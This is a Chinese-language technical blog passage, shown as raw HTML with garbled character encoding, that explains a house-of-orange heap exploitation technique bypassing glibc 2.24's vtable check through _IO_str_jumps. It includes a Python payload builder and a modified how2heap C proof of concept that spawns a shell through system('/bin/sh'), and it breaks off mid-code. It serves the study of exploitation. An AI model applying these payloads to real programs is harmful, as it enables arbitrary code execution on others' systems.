title="0x03 houseoforange (glibc 2.24 bypass)"></a>0x03 houseoforange (glibc 2.24 bypass)</h2><p>åœ¨ glibc 2.24 ä¸­æ–°å¢äº†å¯¹ vtable çš„checkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if unknown vtable pointers are permitted; otherwise,</span></span><br><span class="line"><span class="comment">   terminate the process.  */</span></span><br><span class="line"><span class="keyword">void</span> _IO_vtable_check (<span class="keyword">void</span>) attribute_hidden;</span><br><span class="line"><span class="comment">/* Perform vtable pointer validation.  If validation fails, terminate</span></span><br><span class="line"><span class="comment">   the process.  */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">uintptr_t</span> ptr = (<span class="keyword">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - (<span class="keyword">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œè®¡ç®— <code>section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</code>ï¼Œç´§æ¥ç€ä¼šåˆ¤æ–­ vtable -  __start___libc_IO_vtables çš„ offset ï¼Œå¦‚æœè¿™ä¸ª offset å¤§äº section_length ,å³å¤§äº <code>__stop___libc_IO_vtables - __start___libc_IO_vtables</code> é‚£ä¹ˆå°±ä¼šè°ƒç”¨ <code>_IO_vtable_check()</code> è¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> attribute_hidden</span><br><span class="line">_IO_vtable_check (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">  <span class="keyword">void</span> (*flag) (<span class="keyword">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">     need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">     possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">     boundary.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    Dl_info di;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!rtld_active ()</span><br><span class="line">        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  <span class="comment">/* We cannot perform vtable validation in the static dlopen case</span></span><br><span class="line"><span class="comment">     because FILE * handles might be passed back and forth across the</span></span><br><span class="line"><span class="comment">     boundary.  Therefore, we disable checking in this case.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__dlopen != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  __libc_fatal (<span class="string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸¤æ®µ checkï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190313005638.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/blog-img/20190313005638.png"></a></p><p>è¿™é‡Œï¼Œangelboy æå‡ºæ¥äº†ä¸¤ç§bypass æ–¹æ³•</p><ul><li><p>overwrite IO_accept_foreign_vtables </p><p>ç”±äºæœ‰ PTR_DEMANGLE(flag) çš„å­˜åœ¨ï¼Œå¾ˆéš¾bypass</p></li><li><p>overwrite _dl_open_hook</p><p>è¿™æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰é¡¹ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬èƒ½è¦†ç›– <code>_dl_open_hook</code> æ„å‘³ç€ï¼Œæˆ‘ä»¬èƒ½æ§åˆ¶å…¶ä»–æ›´å¥½çš„å†…å®¹ã€‚</p></li></ul><p>æ­¤æ—¶å°±æŠŠè§†è§’è½¬ç§»åˆ°äº† <code> _IO_FILE</code> ç»“æ„ä½“ä¸Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å› ä¸ºè¿›ç¨‹ä¸­åŒ…å«äº†ç³»ç»Ÿé»˜è®¤çš„ä¸‰ä¸ªæ–‡ä»¶æµ stdin\stdout\stderrï¼Œå› æ­¤è¿™ç§æ–¹å¼å¯ä»¥ä¸éœ€è¦è¿›ç¨‹ä¸­å­˜åœ¨æ–‡ä»¶æ“ä½œï¼Œé€šè¿‡ scanf\printf ä¸€æ ·å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>åœ¨_IO_FILE ä¸­_IO_buf_base è¡¨ç¤ºæ“ä½œçš„èµ·å§‹åœ°å€ï¼Œ_IO_buf_end è¡¨ç¤ºç»“æŸåœ°å€ï¼Œé€šè¿‡æ§åˆ¶è¿™ä¸¤ä¸ªæ•°æ®å¯ä»¥å®ç°æ§åˆ¶è¯»å†™çš„æ“ä½œã€‚è¿™ç§æ–¹æ³•ï¼Œç•™åˆ°ä¸‹ä¸€ä¸ªå°ä¸ªåœ°æ–¹å†™ï¼Œè¿™é‡Œè¦å†™çš„æ˜¯å¦å¤–ä¸€ç§æ–¹æ³•</p><p>æˆ–è€…å°†è§†è§’ç§»åˆ°äº†å…¶ä»–çš„ vtable ä¸­ï¼Œåœ¨ libc ä¸­ä¸ä»…ä»…æœ‰ <code>_IO_file_jumps</code> è¿™ä¹ˆä¸€ä¸ª vtable ï¼Œè¿˜æœ‰<code>_IO_str_jumps</code> ï¼Œå…¶è™šè¡¨ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä»¥ <code>_IO_str_overflow</code> ä¸ºä¾‹ï¼šå½“æˆ‘ä»¬å°†æ–‡ä»¶æŒ‡é’ˆçš„<code>vtable</code>è®¾ç½®ä¸º<code>_IO_str_jumps</code></p><h3 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (_IO_FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  _IO_size_t pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">// must bypass</span></span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) <span class="comment">// should enter here</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span> <span class="comment">// must bypass</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *new_buf;</span><br><span class="line">  <span class="keyword">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">  <span class="keyword">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  _IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen) <span class="comment">// pass ä¸€èˆ¬check ä¸ºçœŸ</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf</span><br><span class="line">    = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);</span><br><span class="line">      (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf);</span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line"></span><br><span class="line">  _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"></span><br><span class="line">  fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ä»¥ä¸‹ä»£ç æ¥åŠ«æŒç¨‹åºæµç¨‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_buf</span><br><span class="line">  = (<span class="keyword">char</span> *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</span><br></pre></td></tr></table></figure><p>åœ¨ <code>_IO_str_overflow</code> ï¼Œæœ‰å‡ ä¸ªæ¡ä»¶éœ€è¦æ»¡è¶³</p><ul><li>fp-&gt;_flags &amp; _IO_NO_WRITESä¸ºå‡</li><li>(pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base) &gt;= ((fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + flush_only(1))</li><li>fp-&gt;_flags &amp; _IO_USER_BUF(0x01)ä¸ºå‡</li><li>2*(fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 ä¸èƒ½ä¸ºè´Ÿæ•°</li><li>new_size = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100; åº”å½“æŒ‡å‘/bin/shå­—ç¬¦ä¸²å¯¹åº”çš„åœ°å€</li><li>fp+0xe0æŒ‡å‘systemåœ°å€</li></ul><p>æ€»ç»“bypasså¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_flags &#x3D; 0</span><br><span class="line">_IO_write_base &#x3D; 0</span><br><span class="line">_IO_write_ptr &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 +1</span><br><span class="line">_IO_buf_end &#x3D; (binsh_in_libc_addr -100) &#x2F; 2 </span><br><span class="line"></span><br><span class="line">_freeres_list &#x3D; 0x2</span><br><span class="line">_freeres_buf &#x3D; 0x3</span><br><span class="line">_mode &#x3D; -1</span><br><span class="line"></span><br><span class="line">vtable &#x3D; _IO_str_jumps - 0x18</span><br></pre></td></tr></table></figure><p>å…³é”®paylaod å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):</span><br><span class="line">payload &#x3D; p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)</span><br><span class="line">payload +&#x3D; p64(0) + p64((binsh_addr - 100) &#x2F; 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) &#x2F; 2) + p64(0) * 6 + p64(0) + p64(0) * 4</span><br><span class="line">payload +&#x3D; p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)</span><br><span class="line">return payload</span><br></pre></td></tr></table></figure><h3 id="IO-str-jumps-gt-finish"><a href="#IO-str-jumps-gt-finish" class="headerlink" title="_IO_str_jumps -&gt; finish"></a>_IO_str_jumps -&gt; finish</h3><p>åŸç†ä¸ä¸Šé¢çš„ _IO_str_jumps -&gt; overflow ç±»ä¼¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  <span class="comment">//[fp+0xe8]</span></span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¡ä»¶ï¼š</p><ol><li>_IO_buf_baseä¸ä¸ºç©º</li><li>_flags &amp; _IO_USER_BUF(0x01) ä¸ºå‡</li></ol><p>æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">_flags = (binsh_in_libc + 0x10) &amp; ~1</span><br><span class="line">_IO_buf_base = binsh_addr</span><br><span class="line"></span><br><span class="line">_freeres_list = 0x2</span><br><span class="line">_freeres_buf = 0x3</span><br><span class="line">_mode = -1</span><br><span class="line">vtable = _IO_str_finish - 0x18</span><br><span class="line">fp+0xe8 -&gt; system_addr</span><br></pre></td></tr></table></figure><h4 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h4><p>ä¿®æ”¹äº† how2heap çš„ houseoforange ä»£ç ï¼Œå¯ä»¥è‡ªå·±åŠ¨æ‰‹è°ƒè¯•ä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span> <span class="params">( <span class="keyword">char</span> *ptr)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1, *p2;</span><br><span class="line">    <span class="keyword">size_t</span> io_list_all, *top;</span><br><span class="line">    <span class="comment">// unsorted bin attack</span></span><br><span class="line">    p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span><span class="number">-16</span>);</span><br><span class="line">    top = (<span class="keyword">size_t</span> *) ( (<span class="keyword">char</span> *) p1 + <span class="number">0x400</span> - <span class="number">16</span>);</span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0xc01</span>;</span><br><span class="line">    p2 = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    io_list_all = top[<span class="number">2</span>] + <span class="number">0x9a8</span>;</span><br><span class="line">    top[<span class="number">3</span>] = io_list_all - <span class="number">0x10</span>;</span><br><span class="line">    <span class="comment">// _IO_str_finish conditions</span></span><br><span class="line">    <span class="keyword">char</span> binsh_in_libc[] = <span class="string">&quot;/bin/sh\x00&quot;</span>; <span class="comment">// we can found &quot;/bin/sh&quot; in libc, here i create it in stack</span></span><br><span class="line"></span><br><span class="line">    top[<span class="number">0</span>] = ((<span class="keyword">size_t</span>) &amp;binsh_in_libc + <span class="number">0x10</span>) &amp; ~<span class="number">1</span>;</span><br><span class="line">    top[<span class="number">7</span>] = ((<span class="keyword">size_t</span>)&amp;binsh_in_libc); <span class="comment">// buf_base</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// house_of_orange conditions</span></span><br><span class="line">    top[<span class="number">1</span>] = <span class="number">0x61</span>;</span><br><span class="line">    top[<span class="number">5</span>] = <span class="number">0x1</span> ; <span class="comment">//_IO_write_ptr</span></span><br><span class="line">    top[<span class="number">20</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">18</span>];</span><br><span class="line">    top[<span class="number">21</span>] = <span class="number">2</span>;</span><br><span class="line">    top[<span class="number">22</span>] = <span class="number">3</span>;</span><br><span class="line">    top[<span class="number">24</span>] = <span class="number">-1</span>;</span><br><span class="line">    top[<span class="number">27</span>] = (<span class="keyword">size_t</span>) <span class="built_in">stdin</span> - <span class="number">0x33f0</span> - <span class="number">0x18</span>;</span><br><span class="line">    top[<span class="number">29</span>] = (<span class="keyword">size_t</span>) &amp;winner;</span><br><span class="line">  top[<span class="number">30</span>] = (<span class="keyword">size_t</span>) &amp;top[<span class="number">30</span>];</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">winner</span><span class="params">(<span class="keyword">char</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    system(ptr);</span><br><span class="line">    <span 